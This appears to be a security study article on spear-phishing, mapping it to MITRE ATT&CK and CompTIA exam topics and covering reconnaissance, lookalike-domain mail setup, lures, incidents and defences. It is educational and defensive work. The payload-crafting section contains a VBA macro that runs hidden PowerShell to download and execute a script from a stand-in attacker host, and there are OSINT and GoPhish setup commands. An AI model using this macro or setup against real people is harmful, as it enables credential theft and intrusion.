---
domain: "attack-techniques"
tags: [phishing, social-engineering, targeted-attack, email-security, threat-intelligence, initial-access]
---
# Spear-Phishing

**Spear-phishing** is a highly targeted form of [[phishing]] in which an attacker crafts a deceptive message specifically tailored to a particular individual, organization, or role, using personalized information to increase credibility and success rates. Unlike generic phishing campaigns sent to thousands of recipients, spear-phishing leverages [[open-source intelligence (OSINT)]] gathered from social media, corporate websites, and data breaches to make messages appear legitimate. It is one of the most effective [[initial access]] techniques used by both nation-state actors and cybercriminals, frequently serving as the entry point for [[advanced persistent threats (APTs)]].

---

## Overview

Spear-phishing sits at the intersection of technical exploitation and psychological manipulation. The attacker's core advantage is specificity: a message referencing the target's manager by name, an ongoing project, a recent business trip, or a familiar vendor logo is far more convincing than a generic "reset your password" email. This personalization dramatically lowers the target's suspicion and raises the probability of the intended action — clicking a link, opening an attachment, providing credentials, or authorizing a wire transfer.

The technique emerged as a natural evolution of mass phishing once defenders and spam filters became effective at detecting bulk, untargeted campaigns. By reducing volume and increasing precision, attackers can evade signature-based detection and human skepticism simultaneously. OSINT collection has become trivially easy through LinkedIn, corporate "About Us" pages, GitHub commit histories, job postings (which reveal internal software stacks), and breached credential databases. Tools like [[Maltego]], [[theHarvester]], and [[Recon-ng]] automate the aggregation of this intelligence into actionable profiles.

Spear-phishing is not limited to email. Modern campaigns use spear-vishing (targeted voice calls), spear-smishing (targeted SMS), and platform-specific attacks via LinkedIn InMail, Microsoft Teams messages, or Slack direct messages — vectors that many organizations have no monitoring coverage for. The concept of **Business Email Compromise (BEC)** is a direct descendant, where attackers impersonate executives to trigger fraudulent financial transactions without ever deploying malware.

High-profile incidents have repeatedly demonstrated the destructive potential of a single successful spear-phish. The 2016 Democratic National Committee breach began with a spear-phishing email sent to John Podesta containing a fake Google security alert. The 2011 RSA SecurID breach began with an email titled "2011 Recruitment Plan" sent to a small group of RSA employees, containing a malicious Excel spreadsheet. The 2020 SolarWinds supply chain attack was preceded by spear-phishing operations to gain initial footholds in target environments. In each case, the attack bypassed sophisticated technical controls through human deception.

Spear-phishing is formally catalogued by [[MITRE ATT&CK]] under **Tactic: Initial Access**, **Technique T1566**, with sub-techniques: **T1566.001** (Spearphishing Attachment), **T1566.002** (Spearphishing Link), and **T1566.003** (Spearphishing via Service). This taxonomy is essential for mapping detection and response strategies to specific attack variants.

---

## How It Works

### Phase 1: Reconnaissance

Before sending a single message, attackers invest significant time in target profiling. Tools and methods include:

```bash
# theHarvester: enumerate emails and subdomains for a target org
theHarvester -d targetcorp.com -b google,linkedin,bing,hunter -l 200

# Recon-ng: modular OSINT framework
recon-ng
> marketplace install all
> modules load recon/domains-contacts/whois_pocs
> options set SOURCE targetcorp.com
> run

# Hunt for breached credentials
# Via CLI using h8mail
h8mail -t victim@targetcorp.com -bc ~/breach-data/ --local
```

Information gathered typically includes:
- **Organizational chart** — names, titles, reporting relationships (LinkedIn, corporate site)
- **Email format** — `firstname.lastname@corp.com` or `flastname@corp.com`
- **Technology stack** — from job postings, GitHub repos, SSL certificate transparency logs
- **Current events** — mergers, recent contracts, conference attendance (press releases, Twitter)
- **Personal details** — hobbies, family members, alma mater (Facebook, Instagram)

### Phase 2: Infrastructure Setup

Attackers establish sending infrastructure designed to pass technical email authentication checks:

```bash
# Register a lookalike domain (typosquatting)
# Examples: targetc0rp.com, targetcorp-security.com, targetcorp.net

# Set up a VPS with proper PTR records and configure Postfix
apt install postfix opendkim opendkim-tools

# Generate DKIM keys
opendkim-genkey -t -s mail -d targetc0rp.com

# Configure SPF record in DNS (TXT record)
# v=spf1 ip4:203.0.113.10 ~all

# Configure DMARC record
# v=DMARC1; p=none; rua=mailto:dmarc@targetc0rp.com

# Use GoPhish for campaign management
./gophish
# Access dashboard at https://localhost:3333
# Default creds: admin / gophish (changed on first login)
```

By setting up valid SPF, DKIM, and DMARC records on their lookalike domain, attackers cause many email gateways to classify the message as legitimate.

### Phase 3: Payload Crafting

**T1566.001 — Malicious Attachment:**

Common payload types include macro-enabled Office documents, ISO files (to bypass Mark-of-the-Web), LNK shortcut files, and PDFs with embedded JavaScript. A macro-laden `.docm`:

```vba
' VBA Macro - maldoc example (educational)
Private Sub Document_Open()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2.attacker.com/stage2.ps1')"
End Sub
```

**T1566.002 — Malicious Link:**

Links point to:
- Credential harvesting pages (cloned Microsoft 365 or VPN login portals)
- Drive-by download pages exploiting browser vulnerabilities
- OAuth consent phishing pages requesting overprivileged app permissions

**T1566.003 — Service-Based:**

Messages sent via LinkedIn, Teams, Slack, WhatsApp, or even GitHub Issues/PR comments, bypassing email security gateways entirely.

### Phase 4: Delivery and Execution

The message is sent with carefully crafted pretexts:
- **IT-themed**: "Urgent: Your MFA enrollment expires today"
- **Finance-themed**: "Invoice INV-2024-0847 attached for your approval"
- **HR-themed**: "Q4 salary review document — confidential"
- **Vendor-themed**: Impersonating a known supplier with a "revised contract"

Once the target interacts, the payload executes, typically establishing a [[command and control (C2)]] channel via HTTPS to blend with normal web traffic, using frameworks like [[Cobalt Strike]], [[Metasploit]], or [[Sliver]].

---

## Key Concepts

- **Pretexting**: The fabricated scenario or backstory an attacker constructs to make their communication seem legitimate; in spear-phishing, pretexts are individually tailored to the target's role, relationships, and current activities rather than generic narratives.

- **Business Email Compromise (BEC)**: A spear-phishing subtype where attackers impersonate trusted figures (executives, vendors, attorneys) to manipulate targets into transferring funds or sensitive data, often without using any malware at all — pure social engineering.

- **Whaling**: A specific variant of spear-phishing that targets high-value individuals — C-suite executives (CEO, CFO, CISO) — where the payoff of a successful compromise is exceptionally high, often used for BEC fraud or to gain privileged access.

- **Adversary-in-the-Middle (AiTM) Phishing**: An advanced spear-phishing technique where attackers proxy the authentication flow in real time (using tools like Evilginx2 or Modlishka) to steal both credentials AND session cookies, thereby bypassing multi-factor authentication.

- **OSINT (Open-Source Intelligence)**: Publicly available information gathered from social media, corporate websites, WHOIS records, certificate transparency logs, job postings, and data breach dumps that attackers use to personalize spear-phishing lures; defenders can use the same techniques to understand their own exposure.

- **Lookalike Domain**: A domain registered by an attacker that closely resembles a legitimate organization's domain through typosquatting (targercorp.com), homograph attacks (using Unicode characters that visually mimic ASCII), or subdomain abuse (payroll.targetcorp.attacker.com).

- **Email Authentication Trio (SPF/DKIM/DMARC)**: Three DNS-based email security standards — Sender Policy Framework, DomainKeys Identified Mail, and Domain-based Message Authentication Reporting and Conformance — that when properly configured can prevent domain spoofing, though they do not protect against lookalike domain attacks.

---

## Exam Relevance

**SY0-701 Domain Mapping**: Spear-phishing primarily appears under **Domain 2.0 — Threats, Vulnerabilities, and Mitigations** (2.2: Common threat vectors and attack surfaces; 2.4: Social engineering tactics).

**High-Frequency Question Patterns:**

1. *"What distinguishes spear-phishing from phishing?"* — The answer is always **personalization/targeting**. Spear-phishing is customized to a specific individual or organization; mass phishing is untargeted. Never confuse these.

2. *"A CEO receives an email appearing to come from the CFO requesting an urgent wire transfer. What type of attack is this?"* — This is **whaling** (targeting executives) and **BEC** (business email compromise). Know both terms apply; CompTIA may accept either.

3. *"Which attack involves a third party intercepting credentials during MFA-protected authentication?"* — **AiTM (Adversary-in-the-Middle) phishing**, distinct from a classic MitM attack because it targets the authentication session cookie rather than the network connection.

4. *"A user receives a LinkedIn message with a job offer containing a malicious PDF. What ATT&CK technique applies?"* — **T1566.003 Spearphishing via Service**.

**Gotchas to Watch For:**

- **Vishing** (voice phishing) and **smishing** (SMS phishing) can be targeted/spear variants too — don't assume "spear" means email-only.
- **Pharming** is different — it involves DNS poisoning to redirect legitimate traffic, not deceptive messages.
- **Whaling** is a *subset* of spear-phishing targeting executives; it is NOT a separate category on the exam but should be recognized as a term.
- SPF/DKIM/DMARC prevent *domain spoofing* but **not** lookalike domain attacks — a common trap answer.
- The correct defense for spear-phishing is **user awareness training + email filtering + MFA** — not just one control in isolation.

---

## Security Implications

### Attack Surface

Every employee with a discoverable email address is a potential spear-phishing target. The attack surface expands with:
- **LinkedIn profiles** revealing org structure, technology use, and relationships
- **GitHub repositories** containing employee emails in commit history
- **Job postings** advertising internal tools (e.g., "experience with CrowdStrike Falcon preferred")
- **Conference speaker lists** and **press releases** naming key personnel
- **Breach databases** providing password patterns and previous email content

### Notable Incidents and CVEs

| Incident | Year | Method | Impact |
|---|---|---|---|
| RSA SecurID Breach | 2011 | Excel attachment with CVE-2011-0609 (Flash 0-day) | Compromise of SecurID seed records |
| Podesta / DNC Hack | 2016 | Fake Google security alert (credential harvest) | Email exfiltration, election interference |
| FACC AG BEC | 2016 | CEO fraud (whaling) | €50 million wire transfer loss |
| Ubiquiti BEC | 2015 | Vendor impersonation | $46.7 million transferred to attacker accounts |
| SolarWinds prelude | 2019-2020 | Targeted credential phishing | Nation-state supply chain access (APT29/Cozy Bear) |
| MGM Resorts Breach | 2023 | Vishing + social engineering of IT helpdesk | $100M+ operational disruption |

### Detection Challenges

- **Low volume** means statistical anomaly detection is ineffective
- **Lookalike domains** pass SPF/DKIM/DMARC checks
- **Contextually relevant content** defeats content-based filters
- **AiTM attacks** defeat MFA — the user successfully authenticates but the session is hijacked
- **Service-based delivery** (Teams, LinkedIn) bypasses email security gateways entirely
- **Polymorphic payloads** evade signature-based AV scanning

---

## Defensive Measures

### Email Gateway Controls

```yaml
# Example: Proofpoint / Mimecast policy principles
- Enable URL rewriting and sandboxing for all inbound links
- Enable attachment sandboxing (detonate in isolated VM before delivery)
- Flag external emails with [EXTERNAL] banner
- Enable lookalike domain detection (edit distance algorithms)
- Block .iso, .img, .vhd attachment types (commonly used to bypass MOTW)
- Enable impersonation protection for VIP/executive email addresses
```

### DNS-Based Email Authentication (Implement ALL THREE)

```bash
# SPF — restrict which servers can send email for your domain
# DNS TXT record for yourdomain.com:
v=spf1 include:_spf.google.com include:mailgun.org ~all
# Use -all (hard fail) rather than ~all (soft fail) when confident

# DKIM — cryptographically sign outgoing mail
# Generate keys and publish public key as DNS TXT record
opendkim-genkey -b 2048 -d yourdomain.com -s selector1

# DMARC — policy enforcement and reporting
# Start with p=none for monitoring, move to p=quarantine, then p=reject
_dmarc.yourdomain.com TXT "v=DMARC1; p=reject; rua=mailto:dmarc-reports@yourdomain.com; ruf=mailto:forensics@yourdomain.com; pct=100"
```

### Multi-Factor Authentication and AiTM Resistance

Standard TOTP-based MFA (Google Authenticator, etc.) does **not** protect against AiTM phishing. Deploy phishing-resistant MFA:

```
Phishing-Resistant MFA Options (in order of strength):
1. FIDO2/WebAuthn Hardware Keys (YubiKey, Titan Key) — origin-bound, cannot be proxied
2. Certificate-Based Authentication (CBA) — PKI smart cards or TPM-backed certs
3. Windows Hello for Business (TPM-backed, device-bound)

Weakest (NOT phishing-resistant):
- SMS OTP (also vulnerable to SIM swap)
- TOTP apps (interceptable by AiTM proxies)
- Email OTP
```

### Organizational and Process Controls

- **Security Awareness Training**: Quarterly simulation campaigns using GoPhish or commercial platforms (KnowBe4, Proofpoint Security Awareness). Track and trend click rates by department.
- **Verified Callback Procedures**: All requests for wire transfers, credential resets, or sensitive data changes received via email must be verified via a separate communication channel using a known-good phone number.
- **Executive Impersonation Protection**: Configure mail rules to reject or quarantine external emails claiming to be from internal executive email addresses.
- **OSINT Self-Assessment**: Regularly run theHarvester, LinkedIn scraping, and Have I Been Pwned checks against your own organization to understand attacker-visible exposure.
- **Conditional Access Policies**: In Azure AD/Entra ID, enforce compliant device requirements so that stolen credentials + AiTM